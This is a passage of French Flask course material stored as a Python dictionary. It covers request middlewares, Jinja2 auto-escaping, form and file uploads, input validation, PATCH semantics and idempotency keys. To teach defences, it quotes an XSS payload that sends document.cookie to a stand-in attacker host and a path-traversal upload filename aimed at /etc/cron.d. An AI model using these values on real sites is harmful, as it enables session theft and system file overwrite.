                    "de Python : chaque thread ou tâche asynchrone manipule son propre espace de noms strictement étanche, "
                    "automatiquement instancié à l'ouverture du contexte de requête et purgé dès sa clôture.\n\n"
                    "> [!TIP] Pourquoi `time.perf_counter()` surpasse `time.time()` pour la latence\n"
                    "> L'horloge système `time.time()` représente l'heure calendaire murale : si le démon réseau NTP recale l'horloge du serveur Linux de quelques millisecondes en arrière pendant une requête, `time.time() - debut` peut produire une durée **négative** ! `time.perf_counter()` interroge le compteur matériel monotone haute résolution du processeur, insensible aux sauts d'horloge NTP."
                )
            },
            {
                "heading": "3. Observabilité industrielle et propagation du `X-Request-ID` (Correlation ID)",
                "body": (
                    "Dans un système en production recevant cent requêtes par seconde, investiguer la plainte d'un "
                    "partenaire signalant *« J'ai reçu une erreur hier vers 14h10 »* au milieu de plusieurs gigaoctets "
                    "de journaux relève de l'aiguille dans une botte de foin. Le patron industriel du **Correlation ID "
                    "(`X-Request-ID`)** résout ce problème à la racine.\n\n"
                    "À l'entrée du middleware `before_request`, si la passerelle amont (Nginx, API Gateway) a déjà attaché "
                    "un en-tête `X-Request-ID`, Flask l'adopte pour préserver la continuité de la trace de bout en bout ; "
                    "sinon, il forge un identifiant unique `uuid4`. En inscrivant systématiquement ce jeton à la fois dans "
                    "chaque ligne de log serveur, dans l'en-tête HTTP de réponse et dans les éventuels messages d'erreur "
                    "JSON RFC 7807, l'exploitation reconstitue en une fraction de seconde la chronologie complète d'un "
                    "appel à travers toute l'infrastructure."
                )
            }
        ],
        "architecture_diagram": (
            "CYCLE DE VIE COMPLET D'UNE REQUÊTE AVEC MIDDLEWARES FLASK :\n\n"
            "  Requête HTTP Entrante\n"
            "          |\n"
            "          v\n"
            "  +------------------------------------------------------------------+\n"
            "  | 1. @app.before_request                                           |\n"
            "  |    -> g.heure_debut = time.perf_counter()                        |\n"
            "  |    -> g.request_id  = \"req-a1b2c3d4\"                             |\n"
            "  +------------------------------------------------------------------+\n"
            "          |\n"
            "          v\n"
            "  +------------------------------------------------------------------+\n"
            "  | 2. Route Métier (@app.route(\"/api/rapports\"))                    |\n"
            "  |    -> Exécute le calcul / SQL et construit l'objet Response      |\n"
            "  +------------------------------------------------------------------+\n"
            "          |\n"
            "          v\n"
            "  +------------------------------------------------------------------+\n"
            "  | 3. @app.after_request(reponse)                                   |\n"
            "  |    -> Calcule duree_ms = (perf_counter() - g.heure_debut) * 1000 |\n"
            "  |    -> Ajoute Headers : X-Request-ID & X-Response-Time-Ms         |\n"
            "  |    -> Écrit le journal d'audit structuré et return reponse       |\n"
            "  +------------------------------------------------------------------+\n"
            "          |\n"
            "          v\n"
            "  Réponse HTTP Sortante vers le Client"
        ),
        "reference_table": {
            "title": "Comparatif des Hooks de Cycle de Vie dans Flask",
            "headers": ["Décorateur Flask", "Moment d'exécution", "Arguments reçus", "Valeur de retour attendue"],
            "rows": [
                ["`@app.before_request`", "Avant chaque route", "Aucun (lit `request` et écrit dans `g`)", "`None` (continuer) ou `Response` (bloquer immédiatement)"],
                ["`@app.after_request`", "Après la route (si aucune exception non gérée)", "L'objet `reponse` créé par la route", "**Obligatoirement** l'objet `reponse` (modifié ou non)"],
                ["`@app.teardown_request`", "Toujours exécuté en toute fin (même en cas de crash)", "L'exception éventuelle `exc`", "Utilisé pour fermer les connexions DB (`db.close()`)"],
                ["`@app.errorhandler(code)`", "Lorsqu'une erreur HTTP ou exception survient", "L'objet erreur `err`", "Un tuple `(jsonify(...), code_http)`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Oublier l'instruction `return reponse` à la fin d'une fonction `@app.after_request`",
                "good": "Toujours terminer `@app.after_request` par `return reponse`",
                "why": "Si `after_request` ne retourne rien (`None`), Flask lève immédiatement `ValueError: View function did not return a response` sur toutes vos routes !"
            },
            {
                "bad": "Utiliser `time.time()` pour mesurer des durées d'exécution de quelques millisecondes",
                "good": "Utiliser l'horloge monotone haute précision `time.perf_counter()`",
                "why": "`time.perf_counter()` offre une résolution à la nanoseconde et n'est jamais faussé par les ajustements d'horloge NTP du système."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_2/04_middlewares_et_audit_log.py` dans le simulateur ci-dessus afin d'observer la trace `[AUDIT]` sur le terminal et les en-têtes `X-Request-ID` et `X-Response-Time-Ms` scellés sur la réponse.",
            "Modifiez l'appel de test pour fournir un en-tête entrant `headers={'X-Request-ID': 'trace-partenaire-007'}` et vérifiez que le middleware propage fidèlement l'identifiant amont au lieu d'en régénérer un nouveau."
        ]
    },

    # =========================================================================
    # JOUR 2 — CHAPITRE 2.5 : MOTEUR DE TEMPLATES JINJA2 & FORMULAIRES WEB HTML (REQUEST.FORM / REQUEST.FILES)
    # =========================================================================
    "d2-l5": {
        "context": (
            "En entreprise, une application Flask hybride expose fréquemment des endpoints JSON pour les échanges "
            "applicatifs tout en servant un **portail d'exploitation back-office**, un guichet de connexion OAuth2 "
            "ou des formulaires de dépôt de pièces justificatives destinés à des agents humains.\n\n"
            "C'est précisément à cette frontière entre Web documentaire et API JSON que surviennent deux fautes "
            "majeures : d'une part, concaténer des balises HTML à même le code Python (`return f\"<h1>{nom}</h1>\"`), "
            "ce qui détruit la maintenabilité et ouvre grand la porte aux attaques **XSS (*Cross-Site Scripting*)** ; "
            "d'autre part, tenter de lire la soumission d'un `<form method=\"POST\">` HTML via `request.get_json()`, "
            "qui renvoie invariablement `None` puisque le navigateur encode nativement les formulaires en "
            "`application/x-www-form-urlencoded` ou `multipart/form-data`. Ce chapitre maîtrise de bout en bout le "
            "moteur **Jinja2**, **`request.form`**, **`request.files`** et l'assainissement anti-traversée de répertoires."
        ),
        "deep_sections": [
            {
                "heading": "1. Compilation de gabarits Jinja2 (`render_template`) et échappement contextuel Anti-XSS",
                "body": (
                    "Conçu par Armin Ronacher conjointement avec Flask, **Jinja2** compile les fichiers `.html` du "
                    "répertoire `templates/` en bytecode Python rapide afin de séparer hermétiquement la logique de contrôle "
                    "et la couche de présentation. Ses trois constructions syntaxiques — `{{ expression }}` pour l'évaluation "
                    "de variables, `{% for ... %} / {% if ... %}` pour le flux structurel et l'héritage de maquette "
                    "`{% extends \"base.html\" %}`, ainsi que `{# ... #}` pour les commentaires serveur non transmis sur le "
                    "réseau — éliminent toute présence de HTML dans vos fichiers `.py`.\n\n"
                    "#### Neutralisation automatique des injections XSS (Auto-Escaping)\n\n"
                    "Supposez qu'un utilisateur malveillant enregistre comme intitulé de stage la chaîne "
                    "`<script>fetch('https://attaquant.example/vol?c='+document.cookie)</script>`. Dans une *f-string* "
                    "Python artisanale, ces caractères bruts sont interprétés par le navigateur de chaque visiteur comme "
                    "un script légitime du domaine ! Pour tous les fichiers `.html` et `.xml`, Jinja2 active nativement "
                    "l'**échappement automatique (*MarkupSafe*)** : les cinq caractères sensibles `<`, `>`, `&`, `\"` et "
                    "`'` sont convertis à la volée en entités HTML inertes (`&lt;script&gt;...`), affichant le texte "
                    "littéral à l'écran sans jamais déclencher le moteur JavaScript."
                )
            },
            {
                "heading": "2. Mécanique sur le fil d'un `<form method=\"POST\">` : `request.form` face à `request.get_json()`",
                "body": (
                    "Lorsqu'un opérateur clique sur le bouton `<button type=\"submit\">` d'un formulaire HTML standard, "
                    "le navigateur parcourt tous les contrôles dotés d'un attribut **`name=\"...\"`** (et ignore totalement "
                    "ceux qui ne possèdent qu'un attribut `id=\"...\"` réservé au CSS/DOM). Il encode ces couples en "
                    "chaîne URL-encodée et positionne un `Content-Type` spécifique que Flask route vers `request.form`.\n\n"
                    "```http — Trame HTTP réellement émise par un navigateur soumettant <form method=\"POST\">\n"
                    "POST /formations HTTP/1.1\n"
                    "Host: intranet.isgp.dz\n"
                    "Content-Type: application/x-www-form-urlencoded\n"
                    "Content-Length: 48\n"
                    "\n"
                    "titre=Architecture+API&duree_jours=5&salle=Labo1\n"
                    "```\n\n"
                    "> [!IMPORTANT] Règle d'aiguillage du corps de requête dans Flask\n"
                    "> Face à `Content-Type: application/x-www-form-urlencoded`, **`request.get_json(silent=True)` vaut `None`**, tandis que **`request.form`** expose les champs décodés (`request.form.get(\"titre\")`, `request.form.get(\"duree_jours\", type=int)`). Pour écrire un endpoint hybride capable de servir à la fois un client API JSON et un formulaire HTML, inspectez simplement `request.is_json` en entrée de contrôleur."
                )
            },
            {
                "heading": "3. Téléversement binaire (`multipart/form-data` → `request.files`), `secure_filename` et patron PRG",
                "body": (
                    "Dès qu'un formulaire inclut une pièce jointe `<input type=\"file\" name=\"document_pdf\">`, l'encodage "
                    "URL classique devient impropre au transport efficace d'octets binaires. La balise `<form>` doit alors "
                    "spécifier **`enctype=\"multipart/form-data\"`** (RFC 7578) : le navigateur génère un séparateur "
                    "aléatoire (`boundary=----WebKitFormBoundary7MA4YWxk`) qui découpe le corps HTTP en sections distinctes, "
                    "livrant les champs texte dans `request.form` et les flux de fichiers (`FileStorage`) dans **`request.files`**.\n\n"
                    "Deux garde-fous de production accompagnent systématiquement ces routes. Premièrement, ne faites "
                    "**jamais** confiance au nom de fichier `fichier.filename` déclaré par le client : un attaquant peut "
                    "forger une trame `filename=\"../../../etc/cron.d/backdoor\"` (*Path Traversal*) pour écraser un fichier "
                    "système lors du `fichier.save(...)`. Passez toujours le nom à travers **`werkzeug.utils.secure_filename()`** "
                    "(idéalement préfixé d'un UUID serveur) et plafonnez `app.config[\"MAX_CONTENT_LENGTH\"]`. Deuxièmement, "
                    "appliquez le patron **PRG (*Post / Redirect / Get*)** : après avoir traité un `POST` navigateur valide, "
                    "répondez par `return redirect(url_for(\"...\"), code=303)` afin qu'un rafraîchissement `F5` de "
                    "l'utilisateur ne rejoue qu'un `GET` inoffensif au lieu de dupliquer l'enregistrement."
                )
            }
        ],
        "architecture_diagram": (
            "COMPARAISON DES 3 FORMATS D'ENVOI POST ET LEUR LECTURE DANS FLASK\n"
            "=================================================================\n\n"
            "  [1] FORMULAIRE HTML CLASSIQUE (<form method=\"POST\">)\n"
            "      Header : Content-Type: application/x-www-form-urlencoded\n"
            "      Body   : titre=API+Flask&duree_jours=5&salle=Salle+A\n"
            "      Flask  : request.form.get(\"titre\")  |  Réponse : render_template(\"...\") ou redirect()\n\n"
            "  [2] FORMULAIRE HTML AVEC FICHIER (<form method=\"POST\" enctype=\"multipart/form-data\">)\n"
            "      Header : Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...\n"
            "      Flask  : Texte -> request.form.get(\"...\")  +  Fichier -> request.files.get(\"document_pdf\")\n\n"
            "  [3] CLIENT API / FETCH JAVASCRIPT / MOBILE\n"
            "      Header : Content-Type: application/json\n"
            "      Body   : {\"titre\": \"API Flask\", \"duree_jours\": 5, \"salle\": \"Salle A\"}\n"
            "      Flask  : request.get_json()         |  Réponse : jsonify({...}), 201"
        ),
        "reference_table": {
            "title": "Tableau Comparatif : Formulaires Web HTML (`request.form` / `Jinja2`) vs API JSON (`request.get_json`)",
            "headers": ["Caractéristique", "Formulaire HTML Classique", "Formulaire avec Fichier (Upload)", "Requête API REST (JSON)"],
            "rows": [
                ["En-tête `Content-Type`", "`application/x-www-form-urlencoded`", "`multipart/form-data`", "`application/json`"],
                ["Objet de lecture dans Flask", "`request.form.get('champ')`", "`request.form` + `request.files.get('fichier')`", "`request.get_json(silent=True)`"],
                ["Attribut HTML obligatoire", "`<input name=\"champ\">` (`name` et non `id`)", "`<form enctype=\"multipart/form-data\">`", "Clé de l'objet JSON `{\"champ\": ...}`"],
                ["Fonction de réponse Flask", "`render_template('page.html', ...)` ou `redirect()`", "`render_template()` ou `jsonify()`", "`jsonify({...}), 201`"],
                ["Commande `curl` équivalente", "`curl -X POST -d \"titre=Flask&jours=5\" URL`", "`curl -X POST -F \"doc=@cours.pdf\" URL`", "`curl -X POST -H \"Content-Type: application/json\" -d '{...}' URL`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écrire du HTML en dur dans Python (`return f'<h1>Bonjour {nom}</h1>'`) au lieu d'utiliser `render_template()`",
                "good": "Placer tout le HTML dans `templates/fichier.html` et utiliser `render_template('fichier.html', nom=nom)`",
                "why": "La concaténation HTML dans Python rend le code ingérable et expose l'application aux injections JavaScript (XSS), alors que Jinja2 échappe automatiquement les variables `{{ nom }}`."
            },
            {
                "bad": "Mettre uniquement `<input id=\"titre\">` dans un formulaire HTML en oubliant l'attribut `name=\"titre\"`",
                "good": "Toujours définir l'attribut `name=\"titre\"` sur chaque `<input>`, `<select>` et `<textarea>`",
                "why": "Le navigateur n'envoie au serveur que les champs possédant un attribut `name` ; sans `name`, `request.form.get('titre')` vaudra toujours `None` !"
            },
            {
                "bad": "Appeler `request.get_json()` pour lire les données d'un `<form method=\"POST\">` HTML standard",
                "good": "Utiliser `request.form.get(...)` pour un formulaire HTML (ou tester `if request.is_json:` pour supporter les deux)",
                "why": "Un formulaire HTML envoie `application/x-www-form-urlencoded`, donc `request.get_json()` renvoie `None`."
            }
        ],
        "practical_exercises": [
            "Ouvrez l'atelier réel sur `/sandbox/formulaire-jinja`, soumettez une nouvelle session via le formulaire HTML et observez comment Flask extrait la trame `application/x-www-form-urlencoded` depuis `request.form`.",
            "Tentez d'injecter `<b>Test XSS</b>` dans le titre ou de soumettre une durée négative afin de vérifier simultanément l'auto-escaping Jinja2 et le rendu des messages de validation serveur."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.1 : CRUD MÉMOIRE, VALIDATION & RFC 7807 (400 vs 422)
    # =========================================================================
    "d3-l1": {
        "context": (
            "Jusqu'à présent, nos endpoints exposaient essentiellement des opérations de consultation sans effet de "
            "bord (`GET`). Dès l'instant où votre API ouvre des routes d'écriture — **Create (`POST`)**, **Update "
            "(`PUT` / `PATCH`)** et **Delete (`DELETE`)** — un axiome absolu de cybersécurité s'applique à chaque "
            "octet reçu du socket : **ne jamais accorder la moindre confiance aux entrées clientes (*Zero-Trust Input "
            "Validation*)**.\n\n"
            "Peu importe le soin apporté aux contrôles JavaScript ou mobiles en amont : tout client muni de `curl` "
            "peut soumettre un JSON tronqué, un tableau `[1, 2]` à la place d'un objet `{...}`, le booléen `true` en "
            "guise de durée ou un tarif négatif. Ce chapitre formalise l'entonnoir de validation défensive côté "
            "serveur, la distinction sémantique entre **`400 Bad Request`** et **`422 Unprocessable Content`**, et "
            "le contrat international de rapport d'erreurs **IETF RFC 7807 / RFC 9457 (*Problem Details*)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Désérialisation défensive avec `request.get_json(silent=True)` et vérification structurelle",
                "body": (
                    "Lorsqu'une route Flask invoque naïvement `corps = request.get_json()` sans argument sur une trame dont "
                    "le JSON comporte une virgule pendante ou une accolade manquante, Werkzeug lève immédiatement une "
                    "exception `BadRequest` qui génère par défaut une page d'erreur HTML. Plus insidieux encore : si le "
                    "client envoie la chaîne JSON valide `\"bonjour\"` ou la liste `[1, 2, 3]`, `get_json()` réussit et "
                    "renvoie un `str` ou une `list` — provoquant quelques lignes plus bas un crash `AttributeError: 'list' "
                    "object has no attribute 'get'` (HTTP 500) !\n\n"
                    "```python — Garde d'entrée infaillible pour tout endpoint JSON d'écriture\n"
                    "corps = request.get_json(silent=True)\n"
                    "if not isinstance(corps, dict):\n"
                    "    return jsonify({\n"
                    "        \"type\": \"https://api.isgp.dz/erreurs/json-invalide\",\n"
                    "        \"title\": \"Charge utile JSON absente ou mal formée\",\n"
                    "        \"status\": 400,\n"
                    "        \"detail\": \"Le corps de la requête doit être un objet JSON {...} valide.\"\n"
                    "    }), 400\n"
                    "```\n\n"
                    "Cette double barrière (`silent=True` suivi de `isinstance(corps, dict)`) garantit mathématiquement "
                    "qu'aucun JSON corrompu, vide ou de type racine inattendu ne franchit la première ligne du contrôleur, "
                    "tout en séparant proprement l'erreur syntaxique **`400 Bad Request`** (le message est illisible) de "
                    "l'erreur sémantique **`422 Unprocessable Content`** (le JSON est bien formé, mais ses valeurs violent "
                    "les invariants métier)."
                )
            },
            {
                "heading": "2. Accumulation exhaustive des erreurs métier plutôt qu'échec au premier champ",
                "body": (
                    "Sur le plan de l'ergonomie développeur (*Developer Experience — DX*) comme de l'expérience utilisateur "
                    "finale, un validateur qui s'arrête dès la première anomalie rencontrée inflige un cycle frustrant "
                    "d'essais-erreurs : sur un formulaire de dix champs comportant quatre saisies invalides, le client "
                    "devrait effectuer quatre allers-retours réseau successifs pour découvrir ses erreurs une à une.\n\n"
                    "La pratique industrielle consiste à exécuter l'ensemble des règles indépendantes de validation de "
                    "domaine — présence après `.strip()`, vérification stricte de type (`isinstance(v, int) and not "
                    "isinstance(v, bool)`), encadrement de bornes numériques et longueur de chaînes — en accumulant chaque "
                    "violation dans un dictionnaire ou une liste structurée `erreurs`. Si `erreurs` est non vide au terme "
                    "de l'inspection, l'API restitue d'un seul bloc la cartographie complète des champs fautifs."
                )
            },
            {
                "heading": "3. Normalisation des réponses d'erreur avec le standard IETF RFC 7807 / RFC 9457",
                "body": (
                    "Lorsqu'une organisation développe vingt microservices dont l'un répond `{\"err\": \"...\"}`, le second "
                    "`{\"error_msg\": [\"...\"]}` et le troisième `{\"fault\": {\"code\": 12}}`, les équipes frontales et "
                    "mobiles sont contraintes d'écrire un parseur d'erreurs sur mesure par service. Pour mettre fin à cette "
                    "fragmentation, l'IETF a publié le standard **RFC 7807** (révisé et enrichi par la **RFC 9457** : "
                    "*Problem Details for HTTP APIs*).\n\n"
                    "> « Ce document définit un format \"Problem Detail\" permettant de transporter des détails lisibles par machine sur les erreurs dans un corps de réponse HTTP, afin d'éviter d'inventer de nouveaux formats de réponse d'erreur pour les APIs HTTP. » — IETF RFC 9457, Abstract\n\n"
                    "```json — Réponse d'erreur normalisée RFC 9457 (application/problem+json)\n"
                    "{\n"
                    "  \"type\": \"https://api.isgp.dz/erreurs/validation-metier\",\n"
                    "  \"title\": \"Échec de validation des données de la formation\",\n"
                    "  \"status\": 422,\n"
                    "  \"instance\": \"/api/v1/formations\",\n"
                    "  \"errors\": [\n"
                    "    {\"champ\": \"titre\", \"message\": \"Longueur minimale requise : 3 caractères.\"},\n"
                    "    {\"champ\": \"duree_jours\", \"message\": \"Doit être compris entre 1 et 30 jours.\"}\n"
                    "  ]\n"
                    "}\n"
                    "```\n\n"
                    "> [!TIP] L'en-tête `Location` sur une réponse `201 Created`\n"
                    "> Lorsque la validation aboutit et qu'un enregistrement `#42` est créé par `POST /api/v1/formations`, la norme RFC 9110 (§15.3.2) recommande d'accompagner le statut **`201 Created`** de l'en-tête `Location: /api/v1/formations/42` désignant l'URI canonique de la ressource nouvellement engendrée."
                )
            }
        ],
        "architecture_diagram": (
            "ENTONNOIR DE VALIDATION DÉFENSIVE D'UNE REQUÊTE POST / PUT :\n\n"
            "  Requête POST entrante\n"
            "        |\n"
            "        +---> 1. Le Body est-il un objet JSON syntaxiquement valide ?\n"
            "        |        NON ---> Retour immédiat : HTTP 400 Bad Request (Syntaxe illisible)\n"
            "        |\n"
            "        +---> 2. Les champs respectent-ils les types et bornes métier (len >= 3, 1 <= duree <= 30) ?\n"
            "        |        NON ---> Retour immédiat : HTTP 422 Unprocessable Entity (Format RFC 7807 + liste 'errors')\n"
            "        |\n"
            "        v     3. OUI ---> Insertion en base + Retour HTTP 201 Created + En-tête Location"
        ),
        "reference_table": {
            "title": "Distinction Précise des Codes HTTP lors de la Création / Validation (`POST`)",
            "headers": ["Code HTTP", "Situation précise", "Exemple d'entrée client", "Action attendue côté client"],
            "rows": [
                ["**`201 Created`**", "Création réussie de la ressource", "`{\"titre\": \"Architecture API\", \"duree_jours\": 5}`", "Lire la nouvelle ressource créée (et son nouvel `id`)"],
                ["**`400 Bad Request`**", "JSON cassé ou illisible", "`{\"titre\": \"API\",` (accolade fermante oubliée)", "Corriger la syntaxe JSON du programme client"],
                ["**`415 Unsupported Media Type`**", "En-tête `Content-Type` manquant ou erroné", "Envoi en `text/plain` au lieu de `application/json`", "Ajouter `-H \"Content-Type: application/json\"`"],
                ["**`422 Unprocessable Entity`**", "JSON valide mais règles métier violées", "`{\"titre\": \"AB\", \"duree_jours\": -5}`", "Afficher les messages de `errors` sur les champs du formulaire"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Supposer que parce que le Frontend JavaScript valide le formulaire, le Backend Flask n'a pas besoin de valider",
                "good": "Toujours appliquer 100 % des validations de types et de bornes dans le Backend Python",
                "why": "Un attaquant utilise `curl` ou un script Python pour appeler directement votre API en contournant totalement l'interface Web !"
            },
            {
                "bad": "Renvoyer `200 OK` sur un `POST` qui crée un nouvel enregistrement",
                "good": "Renvoyer `201 Created` accompagné de l'en-tête `Location: /api/formations/<new_id>`",
                "why": "`201 Created` indique explicitement qu'un nouvel état a été persisté avec succès."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_3/01_api_crud_memoire.py` ci-dessus afin d'observer comment un titre trop court combiné à une durée négative génère en un seul appel un rapport RFC 7807 listant simultanément les deux anomalies.",
            "Lancez l'appel `POST /api/sandbox/formations` depuis le bouton de test rapide, puis soumettez une charge utile invalide pour vérifier le passage de `201 Created` à `422 Unprocessable Entity`."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.2 : PUT VS PATCH & IDEMPOTENCE POST (IDEMPOTENCY-KEY)
    # =========================================================================
    "d3-l2": {
        "context": (
            "En architecture de systèmes transactionnels — passerelles monétiques, billetterie, souscription "
            "administrative ou gestion de stocks — deux problèmes subtils séparent immédiatement un prototype "
            "fragile d'une API de classe industrielle.\n\n"
            "Premièrement, comment modifier une entité existante sans écraser accidentellement les colonnes que "
            "l'écran client ne souhaitait pas toucher (`PUT` face à `PATCH`) ? Deuxièmement, comment garantir "
            "**l'exactement-une-fois (*Exactly-Once Semantics*)** sur une requête `POST` de paiement ou d'inscription "
            "lorsqu'un client mobile traverse une zone blanche 4G et réémet automatiquement sa requête dans le doute ? "
            "Ce chapitre formalise la sémantique **RFC 5789 (`PATCH`)** et implémente le mécanisme d'en-tête "
            "**`Idempotency-Key`** popularisé par Stripe et normalisé à l'IETF."
        ),
        "deep_sections": [
            {
                "heading": "1. Remplacement d'état complet (`PUT` — RFC 9110) face au différentiel partiel (`PATCH` — RFC 5789)",
                "body": (
                    "Considérons l'enregistrement `#1` stocké sur le serveur : `{\"id\": 1, \"titre\": \"Architecture Flask\", "
                    "\"duree_jours\": 5, \"salle\": \"Labo 1\"}`. Si une interface d'administration souhaite uniquement "
                    "transférer ce stage vers `\"Amphi B\"`, le choix entre `PUT` et `PATCH` change radicalement le contrat "
                    "d'échange.\n\n"
                    "Selon la **RFC 9110 (§9.3.4)**, **`PUT /api/v1/formations/1`** ordonne le **remplacement intégral de la "
                    "représentation cible** par celle fournie dans le corps de la requête. L'appelant a donc l'obligation de "
                    "transmettre la totalité des attributs de l'entité (`titre`, `duree_jours` et `salle`) : omettre un champ "
                    "revient soit à demander sa remise à `null`/défaut, soit à provoquer un rejet `422` s'il est obligatoire. "
                    "À l'inverse, introduit par la **RFC 5789** et complété par le format *JSON Merge Patch* (**RFC 7396**), "
                    "**`PATCH /api/v1/formations/1`** n'exprime qu'un **delta partiel** : envoyer `{\"salle\": \"Amphi B\"}` "
                    "modifie exclusivement la clé `salle` tout en laissant `titre` et `duree_jours` strictement intacts."
                )
            },
            {
                "heading": "2. Le théorème des Deux Généraux appliqué aux coupures réseau sur `POST`",
                "body": (
                    "En systèmes distribués, l'impossibilité pour un émetteur de distinguer une requête perdue à l'aller "
                    "d'un acquittement perdu au retour porte un nom classique : le *problème des Deux Généraux*. Lorsqu'un "
                    "téléphone mobile émet `POST /api/v1/paiements` (`25 000 DZD`), que votre serveur Flask valide le débit "
                    "en base SQL et émet `HTTP/1.1 201 Created`, mais que l'antenne radio 4G perd le paquet de retour, le "
                    "client mobile se retrouve face à une erreur `SocketTimeoutException` totalement ambiguë.\n\n"
                    "Si le SDK mobile abandonne alors que la requête s'était perdue à l'aller, la commande échoue ; s'il "
                    "rejoue naïvement son `POST` alors que seul le retour s'était perdu, le serveur — voyant arriver un "
                    "nouveau `POST` non idempotent — exécute **un second débit de 25 000 DZD** ! Ce scénario se produit "
                    "également chaque jour lorsqu'un usager impatient double-clique sur un bouton de validation."
                )
            },
            {
                "heading": "3. Déduplication déterministe par en-tête `Idempotency-Key` et empreinte de charge utile",
                "body": (
                    "Pour conférer l'idempotence aux mutations `POST`, les architectures financières (Stripe, Adyen, PayPal) "
                    "et le standard IETF *Idempotency-Key HTTP Header Field* déplacent l'identification de l'intention côté "
                    "client. **Avant sa toute première tentative**, l'application cliente tire un identifiant aléatoire "
                    "universel (`UUID v4`) attaché à l'opération métier (par exemple au panier validé) et le transmet dans "
                    "l'en-tête `Idempotency-Key`.\n\n"
                    "```http — Requête POST munie d'un jeton d'idempotence client\n"
                    "POST /api/v1/paiements HTTP/1.1\n"
                    "Host: api.isgp.dz\n"
                    "Content-Type: application/json\n"
                    "Idempotency-Key: 7c9e6679-7425-40de-944b-e07fc1f90ae7\n"
                    "\n"
                    "{\"inscription_id\": 842, \"montant_dzd\": 25000}\n"
                    "```\n\n"
                    "Côté serveur, un registre atomique (table SQL à contrainte `UNIQUE` ou clé Redis à expiration de 24h) "
                    "associe cette clé au statut et au corps JSON de la première exécution. Lorsqu'un réessai réseau se "
                    "présente avec le même `Idempotency-Key`, Flask détecte l'entrée en cache, **court-circuite toute "
                    "écriture SQL** et restitue à l'octet près la réponse `201 Created` originelle.\n\n"
                    "> [!IMPORTANT] Protection contre la réutilisation abusive d'une même clé (`422` / `409`)\n"
                    "> Dans une implémentation de production complète, le serveur stocke également le hachage SHA-256 du corps JSON initial à côté de l'`Idempotency-Key`. Si un client bogué réutilise par erreur le même `Idempotency-Key` pour deux montants différents (`25000` puis `90000`), le serveur détecte la divergence d'empreinte et rejette immédiatement l'appel en `422 Unprocessable Entity` !"
                )
            }
        ],
        "architecture_diagram": (
            "PROTECTION ANTI-DOUBLON PAR EN-TÊTE 'Idempotency-Key' SUR UN POST :\n\n"
            "  Appel #1 : POST /api/paiements (Header -> Idempotency-Key: uuid-123)\n"
            "     |---> Clé 'uuid-123' inconnue en cache\n"
            "     |---> Exécute la transaction #1 en base SQL\n"
            "     |---> Sauvegarde CACHE['uuid-123'] = Réponse #1\n"
            "     +---> (Coupure réseau 4G avant réception par le téléphone !)\n\n"
            "  Appel #2 (Réessai automatique) : POST /api/paiements (Header -> Idempotency-Key: uuid-123)\n"
            "     |---> Clé 'uuid-123' TROUVÉE dans CACHE !\n"
            "     |---> [AUCUNE écriture en base SQL — Doublon évité !]\n"
            "     +---> Renvoie immédiatement CACHE['uuid-123'] (avec X-Idempotent-Replay: true)"
        ),
        "reference_table": {
            "title": "Comparatif Technique : `POST` vs `PUT` vs `PATCH`",
            "headers": ["Critère", "`POST /api/formations`", "`PUT /api/formations/1`", "`PATCH /api/formations/1`"],
            "rows": [
                ["**Cible URL**", "Collection (`/formations`)", "Ressource précise (`/formations/1`)", "Ressource précise (`/formations/1`)"],
                ["**Rôle sémantique**", "Créer une nouvelle ressource", "Remplacer intégralement la ressource `#1`", "Modifier partiellement certains champs de `#1`"],
                ["**Champs requis dans le JSON**", "Tous les champs obligatoires", "Tous les champs de la ressource", "Uniquement le(s) champ(s) à modifier"],
                ["**Idempotent par nature ?**", "Non (nécessite `Idempotency-Key`)", "**Oui**", "Oui (si mise à jour par valeur fixe)"],
                ["**Code HTTP de succès**", "`201 Created`", "`200 OK`", "`200 OK`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écraser les champs non fournis par `None` lors d'une requête `PATCH`",
                "good": "Dans un `PATCH`, ne mettre à jour une clé que `if cle in corps:`",
                "why": "Le principe même de `PATCH` est de laisser intacts tous les champs qui ne figurent pas dans le JSON envoyé."
            },
            {
                "bad": "Générer l'`Idempotency-Key` côté serveur au lieu de la faire générer par le client",
                "good": "C'est toujours le **Client** qui génère l'UUID de l'`Idempotency-Key` avant son 1er essai et le réutilise en cas de réessai",
                "why": "Si le serveur générait la clé à chaque requête entrante, il ne pourrait jamais savoir que deux appels successifs correspondent à la même intention du client."
            }
        ],
        "practical_exercises": [
            "Exécutez le simulateur Python ci-dessus afin de vérifier que deux soumissions consécutives portant la clé `idem-998877` n'engendrent qu'un seul enregistrement dans `base_commandes`.",
            "Rendez-vous dans l'onglet **curl & Postman** pour exécuter les commandes `2.3 — PUT`, `2.4 — PATCH` et `2.6 — Idempotency-Key` en inspectant les en-têtes retournés."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.3 : GESTIONNAIRES D'ERREURS GLOBAUX (@ERRORHANDLER)
    # =========================================================================
    "d3-l3": {
        "context": (
            "Parce que Flask est historiquement né pour propulser aussi bien des sites Web documentaires que des "
            "services REST, son moteur Werkzeug réagit par défaut aux incidents de routage (`404 Not Found`, `405 "
            "Method Not Allowed`) ou aux crashs internes (`500`) en émettant **une page Web HTML** (`<!doctype html>"
            "<title>404 Not Found</title>...`).\n\n"
            "Pour un consommateur d'API (application React exécutant `await res.json()`, client mobile Retrofit ou "
            "microservice partenaire), recevoir brusquement du balisage HTML provoque une exception de parsing "
            "secondaire dévastatrice : `SyntaxError: Unexpected token '<', \"<!doctype \"... is not valid JSON`, "
            "occultant la véritable cause métier de l'erreur ! Ce chapitre met en œuvre une couverture d'interception "
            "globale **`@app.errorhandler`** garantissant un contrat **100 % JSON sans fuite d'information sensible**."
        ),
        "deep_sections": [
            {
                "heading": "1. Capturer les rejets précoces du routeur Werkzeug (`404`, `405`, `413`)",
                "body": (
                    "Lorsqu'un client appelle une URI absente de `app.url_map` (`/api/v1/inconnue`) ou emploie un verbe HTTP "
                    "interdit sur une route existante (`DELETE /api/v1/sante`), l'exception `NotFound` (404) ou "
                    "`MethodNotAllowed` (405) est levée par le moteur de correspondance d'URL **avant même qu'aucune de vos "
